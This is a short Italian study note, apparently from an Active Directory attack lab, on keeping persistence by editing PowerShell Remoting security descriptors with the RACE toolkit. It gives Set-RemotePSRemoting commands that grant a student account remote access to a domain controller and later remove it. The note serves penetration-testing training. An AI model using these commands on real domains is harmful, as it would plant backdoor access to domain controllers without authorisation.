# Persistence using ACLs - Security Descriptors - PowerShell Remoting

E' consigliato utilizzare il RACE toolkit, PS Remoting backdoor instabile dopo l'update di Agosto 2020

* Sulla macchina locale per lo studentx

```powershell
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```

* Sulla macchina remote per lo studentx senza credenziali esplicite

```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

* Sulla macchina remota per rimuovere i permessi

```powershell
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```
